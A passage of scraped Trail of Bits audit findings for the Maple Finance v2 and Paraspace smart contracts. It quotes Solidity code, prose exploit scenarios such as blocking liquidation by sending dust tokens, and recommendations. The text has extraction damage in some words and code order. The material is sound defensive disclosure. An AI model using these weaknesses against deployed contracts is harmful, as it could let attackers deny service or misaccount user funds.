"html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The getLatestPrice function retrieves a specic asset price from Chainlink. However, the price (a signed integer) is rst checked that it is non-zero and then is cast to an unsigned integer with a potentially negative value. An incorrect price would temporarily aect the expected amount of fund assets during liquidation. function getLatestPrice(address asset_) external override view returns (uint256 latestPrice_) { // If governor has overridden price because of oracle outage, return overridden price. if (manualOverridePrice[asset_] != 0) return manualOverridePrice[asset_]; ( uint80 roundId_, int256 price_, , uint256 updatedAt_, uint80 answeredInRound_ ) = IChainlinkAggregatorV3Like(oracleFor[asset_]).latestRoundData(); require(updatedAt_ != 0, \"MG:GLP:ROUND_NOT_COMPLETE\"); require(answeredInRound_ >= roundId_, \"MG:GLP:STALE_DATA\"); require(price_ != int256(0), \"MG:GLP:ZERO_PRICE\"); latestPrice_ = uint256(price_); } Figure 5.1: getLatestPrice function (globals-v2/contracts/MapleGlobals.sol#297-308) Exploit Scenario Chainlinks oracle returns a negative value for an in-process liquidation. This value is then unsafely cast to an uint256. The expected amount of fund assets from the protocol is incorrect, which prevents liquidation. Recommendations Short term, check that the price is greater than 0. Long term, add tests for the Chainlink price feed with various edge cases. Additionally, set up a monitoring system in the event of unexpected market failures. A Chainlink oracle can have a minimum and maximum value, and if the real price is outside of that range, it will not be possible to update the oracle; as a result, it will report an incorrect price, and it will be impossible to know this on-chain.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "6. Incorrect implementation of EIP-4626 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The Pool implementation of EIP-4626 is incorrect for maxDeposit and maxMint because these functions do not consider all possible cases in which deposit or mint are disabled. EIP-4626 is a standard for implementing tokenized vaults. In particular, it species the following:  maxDeposit: MUST factor in both global and user-specic limits. For example, if deposits are entirely disabled (even temporarily), it MUST return 0.  maxMint: MUST factor in both global and user-specic limits. For example, if mints are entirely disabled (even temporarily), it MUST return 0. The current implementation of maxDeposit and maxMint in the Pool contract directly call and return the result of the same functions in PoolManager (gure 6.1). As shown in gure 6.1, both functions rely on _getMaxAssets, which correctly checks that the liquidity cap has not been reached and that deposits are allowed and otherwise returns 0. However, these checks are insucient. function maxDeposit(address receiver_) external view virtual override returns (uint256 maxAssets_) { maxAssets_ = _getMaxAssets(receiver_, totalAssets()); } function maxMint(address receiver_) external view virtual override returns (uint256 maxShares_) { uint256 totalAssets_ = totalAssets(); uint256 totalSupply_ = IPoolLike(pool).totalSupply(); uint256 maxAssets_ = _getMaxAssets(receiver_, totalAssets_); maxShares_ = totalSupply_ == 0 ? maxAssets_ : maxAssets_ * totalSupply_ / totalAssets_; } [...] function _getMaxAssets(address receiver_, uint256 totalAssets_) internal view returns (uint256 maxAssets_) { bool depositAllowed_ = openToPublic || isValidLender[receiver_]; uint256 liquidityCap_ = liquidityCap; maxAssets_ = liquidityCap_ > totalAssets_ && depositAllowed_ ? liquidityCap_ - totalAssets_ : 0; } Figure 6.1: The maxDeposit and maxMint functions (pool-v2/contracts/PoolManager.sol#L451-L461) and the _getMaxAssets function (pool-v2/contracts/PoolManager.sol#L516-L520) The deposit and mint functions have a checkCall modier that will call the canCall function in the PoolManager to allow or disallow the action. This modier rst checks if the global protocol pause is active; if it is not, it will perform additional checks in _canDeposit. For this issue, it will be impossible to deposit or mint if the Pool is not active. function canCall(bytes32 functionId_, address caller_, bytes memory data_) external view override returns (bool canCall_, string memory errorMessage_) { if (IMapleGlobalsLike(globals()).protocolPaused()) { return (false, \"PM:CC:PROTOCOL_PAUSED\"); } if (functionId_ == \"P:deposit\") { ( uint256 assets_, address receiver_ ) = abi.decode(data_, (uint256, address)); } return _canDeposit(assets_, receiver_, \"P:D:\"); if (functionId_ == \"P:depositWithPermit\") { ( uint256 assets_, address receiver_, , , , ) = abi.decode(data_, (uint256, address, uint256, uint8, bytes32, bytes32)); return _canDeposit(assets_, receiver_, \"P:DWP:\"); } if (functionId_ == \"P:mint\") { ( uint256 shares_, address receiver_ ) = abi.decode(data_, (uint256, address)); \"P:M:\"); } return _canDeposit(IPoolLike(pool).previewMint(shares_), receiver_, if (functionId_ == \"P:mintWithPermit\") { ( uint256 shares_, address receiver_, , , , , ) = abi.decode(data_, (uint256, address, uint256, uint256, uint8, bytes32, bytes32)); return _canDeposit(IPoolLike(pool).previewMint(shares_), receiver_, \"P:MWP:\"); } [...] function _canDeposit(uint256 assets_, address receiver_, string memory errorPrefix_) internal view returns (bool canDeposit_, string memory errorMessage_) { if (!active) return (false, _formatErrorMessage(errorPrefix_, \"NOT_ACTIVE\")); if (!openToPublic && !isValidLender[receiver_]) return (false, _formatErrorMessage(errorPrefix_, \"LENDER_NOT_ALLOWED\")); if (assets_ + totalAssets() > liquidityCap) return (false, _formatErrorMessage(errorPrefix_, \"DEPOSIT_GT_LIQ_CAP\")); return (true, \"\"); } Figure 6.2: The canCall function (pool-v2/contracts/PoolManager.sol#L370-L393), and the _canDeposit function (pool-v2/contracts/PoolManager.sol#L498-L504) The maxDeposit and maxMint functions should return 0 if the global protocol pause is active or if the Pool is not active; however, these cases are not considered. Exploit Scenario A third-party protocol wants to deposit into Maples pool. It rst calls maxDeposit to obtain the maximum amount of asserts it can deposit and then calls deposit. However, the latter function call will revert because the protocol is paused. Recommendations Short term, return 0 in maxDeposit and maxMint if the protocol is paused or if the pool is not active. Long term, maintain compliance with the EIP specication being implemented (in this case, EIP-4626).", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "7. setAllowedSlippage and setMinRatio functions are unreachable ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The administrative functions setAllowedSlippage and setMinRatio have a requirement that they can be called only by the poolManager. However, they are not called by any reachable function in the PoolManager contract. function setAllowedSlippage(address collateralAsset_, uint256 allowedSlippage_) external override { require(msg.sender == poolManager, \"LM:SAS:NOT_POOL_MANAGER\"); require(allowedSlippage_ <= HUNDRED_PERCENT, \"LM:SAS:INVALID_SLIPPAGE\"); emit AllowedSlippageSet(collateralAsset_, allowedSlippageFor[collateralAsset_] = allowedSlippage_); } function setMinRatio(address collateralAsset_, uint256 minRatio_) external override { require(msg.sender == poolManager, \"LM:SMR:NOT_POOL_MANAGER\"); emit MinRatioSet(collateralAsset_, minRatioFor[collateralAsset_] = minRatio_); } Figure 7.1: setAllowedSlippage and setMinRatio function (pool-v2/contracts/LoanManager.sol#L75-L85) Exploit Scenario Alice, a pool administrator, needs to adjust the slippage parameter of a particular collateral token. Alices transaction reverts since she is not the poolManager contract address. Alice checks the PoolManager contract for a method through which she can set the slippage parameter, but none exists. Recommendations Short term, add functions in the PoolManager contract that can reach setAllowedSlippage and setMinRatio on the LoanManager contract. Long term, add unit tests that validate all system parameters can be updated successfully.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "8. Inaccurate accounting of unrealizedLosses during default warning revert ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "During the process of executing the removeDefaultWarning function, an accounting discrepancy fails to decrement netLateInterest from unrealizedLosses, resulting in an over-inated value. The triggerDefaultWarning function updates unrealizedLosses with the defaulting loans principal_, netInterest_, and netLateInterest_ values. emit UnrealizedLossesUpdated(unrealizedLosses += _uint128(principal_ + netInterest_ + netLateInterest_)); Figure 8.1: The triggerDefaultWarning function (pool-v2/contracts/LoanManager.sol#L331) When the warning is removed by the _revertDefaultWarning function, only the values of the defaulting loans principal and interest are decremented from unrealizedLosses. This leaves a discrepancy equal to the amount of netLateInterest_. function _revertDefaultWarning(LiquidationInfo memory liquidationInfo_) internal { accountedInterest -= _uint112(liquidationInfo_.interest); unrealizedLosses -= _uint128(liquidationInfo_.principal + liquidationInfo_.interest); } Figure 8.2: The _revertDefaultWarning function (pool-v2/contracts/LoanManager.sol#L631-L634) Exploit Scenario Alice has missed several interest payments on her loan and is about to default. Bob, the poolManager, calls triggerDefaultWarning on the loan to account for the unrealized loss in the system. Alice makes a payment to bring the loan back into good standing, the claim function is triggered, and _revertDefaultWarning is called to remove the unrealized loss from the system. The net value of Alices loans late interest value is still accounted for in the value of unrealizedLosses. From then on, when users call Pool.withdraw, they will have to exchange more shares than are due for the same amount of assets. Recommendations Short term, add the value of netLateInterest to the amount decremented from unrealizedLosses when removing the default warning from the system. Long term, implement robust unit-tests and fuzz tests to validate math and accounting ows throughout the system to account for any unexpected accounting discrepancies.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "9. Attackers can prevent the pool manager from nishing liquidation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The finishCollateralLiquidation function requires that a liquidation is no longer active. However, an attacker can prevent the liquidation from nishing by sending a minimal amount of collateral token to the liquidator address. function finishCollateralLiquidation(address loan_) external override nonReentrant returns (uint256 remainingLosses_, uint256 platformFees_) { require(msg.sender == poolManager, \"LM:FCL:NOT_POOL_MANAGER\"); require(!isLiquidationActive(loan_), \"LM:FCL:LIQ_STILL_ACTIVE\"); [...] if (toTreasury_ != 0) ILiquidatorLike(liquidationInfo_.liquidator).pullFunds(fundsAsset, mapleTreasury(), toTreasury_); if (toPool_ != 0) ILiquidatorLike(liquidationInfo_.liquidator).pullFunds(fundsAsset, pool, toPool_); if (recoveredFunds_ != 0) ILiquidatorLike(liquidationInfo_.liquidator).pullFunds(fundsAsset, ILoanLike(loan_).borrower(), recoveredFunds_); Figure 9.1: An excerpt of the finishCollateralLiquidation function (pool-v2/contracts/LoanManager.sol#L199-L232) The finishCollateralLiquidation function uses the isLiquidationActive function to verify if the liquidation process is nished by checking the collateral asset balance of the liquidator address. Because anyone can send tokens to that address, it is possible to make isLiquidationActive always return false. function isLiquidationActive(address loan_) public view override returns (bool isActive_) { address liquidatorAddress_ = liquidationInfo[loan_].liquidator; // TODO: Investigate dust collateralAsset will ensure `isLiquidationActive` is always true. isActive_ = (liquidatorAddress_ != address(0)) && (IERC20Like(ILoanLike(loan_).collateralAsset()).balanceOf(liquidatorAddress_) != uint256(0)); } Figure 9.2: The isLiquidationActive function (pool-v2/contracts/LoanManager.sol#L702-L707) Exploit Scenario Alice's loan is being liquidated. Bob, the pool manager, tries to call finishCollateralLiquidation to get back the recovered funds. Eve front-runs Bobs call by sending 1 token of the collateral asset to the liquidator address. As a consequence, Bob cannot recover the funds. Recommendations Short term, use a storage variable to track the remaining collateral in the Liquidator contract. As a result, the collateral balance cannot be manipulated through the transfer of tokens and can be safely checked in isLiquidationActive. Long term, avoid using exact comparisons for ether and token balances, as users can increase those balances by executing transfers, making the comparisons evaluate to false.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "10. WithdrawalManager can have an invalid exit conguration ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The setExitConfig function sets the conguration to exit from the pool. However, unsafe casting allows this function to set an invalid conguration. The function performs a few initial checks; for example, it checks that windowDuration is not 0 and that windowDuration is less than cycleDuration. However, when setting the conguration, the initialCycleId_, initialCycleTime_, cycleDuration_, and windowDuration_ are unsafely casted to uint64 from uint256. In particular, cycleDuration_ and windowDuration_ are user-controlled by the poolDelegate. function setExitConfig(uint256 cycleDuration_, uint256 windowDuration_) external override { CycleConfig memory config_ = _getCurrentConfig(); require(msg.sender == poolDelegate(), \"WM:SEC:NOT_AUTHORIZED\"); require(windowDuration_ != 0, \"WM:SEC:ZERO_WINDOW\"); require(windowDuration_ <= cycleDuration_, \"WM:SEC:WINDOW_OOB\"); require( cycleDuration_ != config_.cycleDuration || windowDuration_ != config_.windowDuration, \"WM:SEC:IDENTICAL_CONFIG\" ); [...] cycleConfigs[latestConfigId_] = CycleConfig({ initialCycleId: uint64(initialCycleId_), initialCycleTime: uint64(initialCycleTime_), cycleDuration: uint64(cycleDuration_), windowDuration: uint64(windowDuration_) }); } Figure 10.1: The setExitConfig function (withdrawal-manager/contracts/WithdrawalManager.sol#L83-L115) Exploit Scenario Bob, the pool delegate, calls setExitCong with cycleDuration_ equal to type(uint64).max + 1 and windowDuration_ equal to type(uint64).max. The checks pass, but the conguration does not adhere to the invariant windowDuration <= cycleDuration. Recommendations Short term, safely cast the variables when setting the conguration to avoid any possible errors. Long term, improve the unit-tests to check that important invariants always hold.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "11. Loan can be impaired when the protocol is paused ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The impairLoan function allows the poolDelegate or governor to impair a loan when the protocol is paused due to a missing whenProtocolNotPaused modier. The role of this function is to mark the loan at risk of default by updating the loans nextPaymentDueDate. Although it would be impossible to default the loan in a paused state (because the triggerDefault function correctly has the whenProtocolNotPaused modier), it is unclear if the other state variable changes would be a problem in a paused system. Additionally, if the protocol is unpaused, it is possible to call removeLoanImpairment and restore the loans previous state. function impairLoan(address loan_) external override { bool isGovernor_ = msg.sender == governor(); require(msg.sender == poolDelegate || isGovernor_, \"PM:IL:NOT_AUTHORIZED\"); ILoanManagerLike(loanManagers[loan_]).impairLoan(loan_, isGovernor_); emit LoanImpaired(loan_, block.timestamp); } Figure 11.1: The impairLoan function (pool-v2/contracts/PoolManager.sol#L307-315) Exploit Scenario Bob, the MapleGlobal security admin, sets the protocol in a paused state due to an unknown occurrence, expecting the protocols state to not change and debugging the possible issue. Alice, a pool delegate who does not know that the protocol is paused, calls impairLoan, thereby changing the state and making Bobs debugging more dicult. Recommendations Short term, add the missing whenProtocolNotPaused modier to the impairLoan function. Long term, improve the unit-tests to check for the correct system behavior when the protocol is paused and unpaused. Additionally, integrate the Slither script in appendix D into the development workow.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "12. Fee treasury could go to the zero address ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf", "body": "The _disburseLiquidationFunds and _distributeClaimedFunds functions, which send the fees to the various actors, do not check that the mapleTreasury address was set. Althoughthe mapleTreasury address is supposedly set immediately after the creation of the MapleGlobals contract, no checks prevent sending the fees to the zero address, leading to a loss for Maple. function _disburseLiquidationFunds(address loan_, uint256 recoveredFunds_, uint256 platformFees_, uint256 remainingLosses_) internal returns (uint256 updatedRemainingLosses_, uint256 updatedPlatformFees_) { [...] require(toTreasury_ == 0 || ERC20Helper.transfer(fundsAsset_, mapleTreasury(), toTreasury_), \"LM:DLF:TRANSFER_MT_FAILED\"); Figure 12.1: The _disburseLiquidationFunds function (pool-v2/contracts/LoanManager.sol#L566-L584) Exploit Scenario Bob, a Maple admin, sets up the protocol but forgets to set the mapleTreasury address. Since there are no warnings, the expected claim or liquidation fees are sent to the zero address until the Maple team notices the issue. Recommendations Short term, add a check that the mapleTreasury is not set to address zero in _disburseLiquidationFunds and _distributeClaimedFunds. Long term, improve the unit and integration tests to check that the system behaves correctly both for the happy case and the non-happy case.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "1. Unconventional test structure ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf", "body": "Aspects of the Paraspace tests make them dicult to run. Tests that are dicult to run are less likely to be run. First, the Paraspace tests are congured to initialize all tests before any single test can be run. Therefore, even simple tests incur the initialization costs of the most expensive tests. Such a design hinders development. Figure 1.1 shows the rst 25 lines that are output during test initialization. Approximately 270 lines are output before the rst test is run. As shown in the gure, several ERC20 and ERC721 tokens are deployed during initialization. These steps are unnecessary in many testing situations, such as if a user wants to run a test that does not involve these tokens. - Environment - Network : hardhat -> Deploying test environment... ------------ step 00 done ------------ deploying now DAI deploying now WETH deploying now USDC deploying now USDT deploying now WBTC deploying now stETH deploying now APE deploying now aWETH deploying now cETH deploying now PUNK ------------ step 0A done ------------ deploying now WPUNKS deploying now BAYC deploying now MAYC deploying now DOODLE deploying now AZUKI deploying now CLONEX deploying now MOONBIRD deploying now MEEBITS deploying now OTHR deploying now UniswapV3 ... Figure 1.1: The rst 25 lines emitted by Paraspace tests Second, the paraspace-core repository uses the paraspace-deploy repository as a Git submodule and relies on it when being built and tested. However, while the former is public, the latter is private. Therefore, paraspace-core can be built or tested only by those with access to paraspace-deploy. Finally, some tests use nested it calls (gure 1.2), which are not supported by Mocha. it(\"deposited aWETH should have balance multiplied by rebasing index\", async () => { ... it(\"should be able to supply aWETH and mint rebasing PToken\", async () => { ... }); it(\"expect the scaled balance to be the principal balance multiplied by Aave pool liquidity index divided by RAY (2^27)\", async () => { ... }); }); Figure 1.2: test-suites/rebasing.spec.ts#L125L165 Developers should strive to implement testing that thoroughly covers the project and tests against both bad and expected inputs. Having robust unit and integration tests can greatly increase both developers and users condence in the codes functionality. However, tests cannot benet the system if they are not actually run. Therefore, tests should be made as easy to run as possible. Exploit Scenario Alice, a Paraspace developer, develops fewer tests than she otherwise would because she is frustrated by the time required to run the tests. Paraspaces test coverage suers as a result. Recommendations Short term, take the following steps:  Adopt a more tailored testing solution that deploys only the resources needed to run any given test.  Either make the paraspace-deploy repository public or eliminate paraspace-cores reliance on paraspace-deploy.  Rewrite the tests in rebasing.spec.ts to eliminate the nested it calls. Making tests easier to run will help ensure that they are actually run. Long term, consider timing individual tests in the continuous integration process. Doing so will help to identify tests with extreme resource requirements. References  Pull request #4525 in mochajs/mocha: Throw on nested it call  Stack Overow: Mocha test case - are nested it( ) functions kosher? 2. Insu\u0000cient event generation Severity: Low Diculty: Low Type: Auditing and Logging Finding ID: TOB-PARASPACE-2 Target: Various targets", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Missing supportsInterface functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf", "body": "According to EIP-165, a contracts implementation of the supportsInterface function should return true for the interfaces that the contract supports. Outside of the dependencies and mocks directories, only one Paraspace contract has a supportsInterface function. For example, each of the following contracts includes an onERC721Received function; therefore, they should have a supportsInterface function that returns true for the ERC721TokenReceiver interface ( PoolCores onERC721Received implementation appears in gure 3.1):  contracts/ui/MoonBirdsGateway.sol  contracts/ui/UniswapV3Gateway.sol  contracts/ui/WPunkGateway.sol  contracts/protocol/tokenization/NToken.sol  contracts/protocol/tokenization/NTokenUniswapV3.sol  contracts/protocol/tokenization/NTokenMoonBirds.sol  contracts/protocol/pool/PoolCore.sol // This function is necessary when receive erc721 from looksrare function onERC721Received( address, address, uint256, bytes memory ) external virtual returns (bytes4) { return this.onERC721Received.selector; } Figure 3.1: contracts/protocol/pool/PoolCore.sol#L773L781 Exploit Scenario Alices contract tries to send an ERC721 token to a PoolCore contract. Alices contract rst tries to determine whether the PoolCore contract supports the ERC721TokenReceiver interface by calling supportsInterface. When the call reverts, Alices contract aborts the transfer. Recommendations Short term, add supportsInterface functions to all contracts that implement a well-known interface. Doing so will help to ensure that Paraspace contracts can interact with external contracts. Long term, add tests to ensure that each contracts supportsInterface function returns true for the interfaces that the contract supports and false for some subset of the interfaces that the contract does not support. Doing so will help to ensure that the supportsInterface functions work correctly. References  EIP-165: Standard Interface Detection  EIP-721: Non-Fungible Token Standard", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "4. ERC1155 asset type is dened but not implemented ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf", "body": "The asset type ERC1155 is dened in DataTypes.sol but is not otherwise supported. Having an unsupported variant in the code is risky, as developers could use it accidentally. The AssetType declaration appears in gure 4.1. It consists of three variants, one of which is ERC1155. However, ERC1155 does not appear anywhere else in the code. For example, it does not appear in the executeRescueTokens function in the PoolLogic.sol contract (gure 4.2), meaning it is not possible to rescue ERC1155 tokens. enum AssetType { ERC20, ERC721, ERC1155 } Figure 4.1: contracts/protocol/libraries/types/DataTypes.sol#L7L11 function executeRescueTokens( DataTypes.AssetType assetType, address token, address to, uint256 amountOrTokenId ) external { if (assetType == DataTypes.AssetType.ERC20) { IERC20(token).safeTransfer(to, amountOrTokenId); } else if (assetType == DataTypes.AssetType.ERC721) { IERC721(token).safeTransferFrom(address(this), to, amountOrTokenId); } } Figure 4.2: contracts/protocol/libraries/logic/PoolLogic.sol#L80L91 Exploit Scenario Alice, a Paraspace developer, writes code that uses the ERC1155 asset type. Because the asset type is not implemented, Alices code does not work correctly. Recommendations Short term, remove ERC1155 from AssetType. Doing so will eliminate the possibility that a developer will use it accidentally. Long term, if the ERC1155 asset type is re-enabled, thoroughly test all code using it. Regularly review all conditionals involving asset types (e.g., as in gure 4.2) to verify that they handle all applicable asset types correctly. Taking these steps will help to ensure that the code works properly following the incorporation of ERC1155 assets.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. executeMintToTreasury silently skips non-ERC20 tokens ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf", "body": "The executeMintToTreasury function silently ignores non-ERC20 assets passed to it. Such behavior could allow erroneous calls to executeMintToTreasury to go unnoticed. The code for executeMintToTreasury appears in gure 5.1. It is called from the mintToTreasury function in PoolParameters.sol (gure 5.2). As shown in gure 5.1, non-ERC20 assets are silently skipped. function executeMintToTreasury( mapping(address => DataTypes.ReserveData) storage reservesData, address[] calldata assets ) external { for (uint256 i = 0; i < assets.length; i++) { address assetAddress = assets[i]; DataTypes.ReserveData storage reserve = reservesData[assetAddress]; DataTypes.ReserveConfigurationMap memory reserveConfiguration = reserve.configuration; // this cover both inactive reserves and invalid reserves since the flag will be 0 for both !reserveConfiguration.getActive() || reserveConfiguration.getAssetType() != DataTypes.AssetType.ERC20 continue; if ( ) { } ... } } Figure 5.1: contracts/protocol/libraries/logic/PoolLogic.sol#L98L134 function mintToTreasury(address[] calldata assets) external virtual override nonReentrant { } PoolLogic.executeMintToTreasury(_reserves, assets); Figure 5.2: contracts/protocol/pool/PoolParameters.sol#L97L104 Note that because this is a minting operation, it likely meant to be called by an administrator. However, an administrator could pass a non-ERC20 asset in error. Because the function silently skips such assets, the error could go unnoticed. Exploit Scenario Alice, a Paraspace administrator, calls mintToTreasury with an array of assets. Alice accidentally sets one array element to an ERC721 asset. Alices mistake is silently ignored by the on-chain code, and no error is reported. Recommendations Short term, have executeMintToTreasury revert when a non-ERC20 asset is passed to it. Doing so will ensure that callers are alerted to such errors. Long term, regularly review all conditionals involving asset types to verify that they handle all applicable asset types correctly. Doing so will help to identify problems involving the handling of dierent asset types.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "6. getReservesData does not set all AggregatedReserveData elds ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf", "body": "The getReservesData function lls in an AggregatedReserveData structure for the reserve handled by an IPoolAddressesProvider. However, the function does not set the structures name and assetType elds. Therefore, o-chain code relying on this function will see uninitialized data. Part of the AggregatedReserveData structure appears in gure 6.1. The complete structure consists of 53 elds. Each iteration of the loop in getReservesData (gure 6.2) lls in the elds of one AggregatedReserveData structure. However, the loop does not set the structures name elds. And although reserve assetTypes are computed, they are never stored in the structure. struct AggregatedReserveData { address underlyingAsset; string name; string symbol; ... //AssetType DataTypes.AssetType assetType; } Figure 6.1: contracts/ui/interfaces/IUiPoolDataProvider.sol#L18L78 function getReservesData(IPoolAddressesProvider provider) public view override returns (AggregatedReserveData[] memory, BaseCurrencyInfo memory) { IParaSpaceOracle oracle = IParaSpaceOracle(provider.getPriceOracle()); IPool pool = IPool(provider.getPool()); address[] memory reserves = pool.getReservesList(); AggregatedReserveData[] memory reservesData = new AggregatedReserveData[](reserves.length); for (uint256 i = 0; i < reserves.length; i++) { ... DataTypes.AssetType assetType; ( reserveData.isActive, reserveData.isFrozen, reserveData.borrowingEnabled, reserveData.stableBorrowRateEnabled, isPaused, assetType ) = reserveConfigurationMap.getFlags(); ... } ... return (reservesData, baseCurrencyInfo); } Figure 6.2: contracts/ui/UiPoolDataProvider.sol#L83L269 Exploit Scenario Alice writes o-chain code that calls getReservesData. Alices code treats the returned name and assetType elds as if they have been properly lled in. Because these elds have not been set, Alices code behaves incorrectly (e.g., by trying to transfer ERC721 tokens as though they were ERC20 tokens). Recommendations Short term, adjust getReservesData so that it sets the name and assetType elds. Doing so will help prevent o-chain code from receiving uninitialized data. Long term, test code that is meant to be called from o-chain to verify that every returned eld is set. Doing so can help to catch bugs like this one.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "7. Excessive type repetition in returned tuples ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf", "body": "Several functions return tuples that contain many elds of the same type adjacent to one another. Such a practice is error-prone, as callers could easily confuse the elds. An example appears in gure 7.1. The tuple returned by the calculateUserAccountData function contains nine elds of type uint256 adjacent to each other. An example in which the function is called appears in gure 7.2. As the gure makes evident, a misplaced comma, indicating that the caller identied the wrong eld holding the data of interest, could have disastrous consequences. /** * @notice Calculates the user data across the reserves. * @dev It includes the total liquidity/collateral/borrow balances in the base currency used by the price feed, * the average Loan To Value, the average Liquidation Ratio, and the Health factor. * @param reservesData The state of all the reserves * @param reservesList The addresses of all the active reserves * @param params Additional parameters needed for the calculation * @return The total collateral of the user in the base currency used by the price feed * @return The total ERC721 collateral of the user in the base currency used by the price feed * @return The total debt of the user in the base currency used by the price feed * @return The average ltv of the user * @return The average liquidation threshold of the user * @return The health factor of the user * @return True if the ltv is zero, false otherwise **/ function calculateUserAccountData( mapping(address => DataTypes.ReserveData) storage reservesData, mapping(uint256 => address) storage reservesList, DataTypes.CalculateUserAccountDataParams memory params ) internal view returns ( uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, bool ) { ... return ( vars.totalCollateralInBaseCurrency, vars.totalERC721CollateralInBaseCurrency, vars.totalDebtInBaseCurrency, vars.avgLtv, vars.avgLiquidationThreshold, vars.avgERC721LiquidationThreshold, vars.payableDebtByERC20Assets, vars.healthFactor, vars.erc721HealthFactor, vars.hasZeroLtvCollateral ); Figure 7.1: contracts/protocol/libraries/logic/GenericLogic.sol#L58L302 } ( vars.userGlobalCollateralBalance, , vars.userGlobalTotalDebt, , , , , , vars.healthFactor, ) = GenericLogic.calculateUserAccountData( Figure 7.2: contracts/protocol/libraries/logic/LiquidationLogic.sol#L393L404 Also, note that the documentation of calculateUserAccountData does not accurately reect the implementation. The documentation describes only six returned uint256 elds (highlighted in yellow in gure 7.1). In reality, the function returns an additional three (highlighted in red in gure 7.1). Less extreme but similar examples of adjacent eld types in tuples appear in gures 7.3 and 7.4. function getFlags(DataTypes.ReserveConfigurationMap memory self) internal pure returns ( bool, bool, bool, bool, bool, DataTypes.AssetType ) Figure 7.3: contracts/protocol/libraries/configuration/ReserveConfiguration.sol#L516 L526 function getParams(DataTypes.ReserveConfigurationMap memory self) internal pure returns ( uint256, uint256, uint256, uint256, uint256, bool ) Figure 7.4: contracts/protocol/libraries/configuration/ReserveConfiguration.sol#L552 L562 Exploit Scenario Alice, a Paraspace developer, writes code that calls calculateUserAccountData. Alice misplaces a comma, causing the health factor to be interpreted as the ERC721 health factor. Alices code behaves incorrectly as a result. Recommendations Short term, take the following steps:  Choose a threshold for adjacent elds of the same type in tuples (e.g., four). Wherever functions return tuples containing a number of adjacent elds of the same type greater than that threshold, have the functions return structs instead. Returning a struct instead of a tuple will reduce the likelihood that a caller will confuse the returned values.  Correct the documentation in gure 7.1. Doing so will reduce the likelihood that calculateUserAccountData is miscalled. Long term, as new functions are added to the codebase, ensure that they respect the threshold chosen in implementing the short-term recommendation. Doing so will help to ensure that values returned from the new functions are not misinterpreted.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "8. Incorrect grace period could result in denial of service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf", "body": "The PriceOracleSentinel contracts isBorrowAllowed and isLiquidationAllowed functions return true only if a grace period has elapsed since the oracles last update. Setting the grace period parameter too high could result in a denial-of-service condition. The relevant code appears in gure 8.1. Both isBorrowAllowed and isLiquidationAllowed call _isUpAndGracePeriodPassed, which checks whether block.timestamp minus lastUpdateTimestamp is greater than _gracePeriod. /// @inheritdoc IPriceOracleSentinel function isBorrowAllowed() external view override returns (bool) { return _isUpAndGracePeriodPassed(); } /// @inheritdoc IPriceOracleSentinel function isLiquidationAllowed() external view override returns (bool) { return _isUpAndGracePeriodPassed(); } /** * @notice Checks the sequencer oracle is healthy: is up and grace period passed. * @return True if the SequencerOracle is up and the grace period passed, false otherwise */ function _isUpAndGracePeriodPassed() internal view returns (bool) { (, int256 answer, , uint256 lastUpdateTimestamp, ) = _sequencerOracle .latestRoundData(); return answer == 0 && block.timestamp - lastUpdateTimestamp > _gracePeriod; } Figure 8.1: contracts/protocol/configuration/PriceOracleSentinel.sol#L69L88 Suppose block.timestamp minus lastUpdateTimestamp is never more than N seconds. Consequently, setting _gracePeriod to N or greater would mean that isBorrowAllowed and isLiquidationAllowed never return true. The code in gure 8.1 resembles some example code from the Chainlink documentation. However, in that example code, the grace period is relative to when the round started, not when the round was updated. Exploit Scenario Alice, a Paraspace administrator, accidentally sets the grace period to higher than the interval at which rounds are updated. Borrowing and liquidation operations are eectively disabled as a result. Recommendations Short term, either have the grace period start from a rounds startedAt time, or consider removing the grace period entirely. Doing so will eliminate a potential denial-of-service condition. Long term, monitor Chainlink oracles behavior to determine long-term trends. Doing so will help in determining safe parameter choices.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "9. 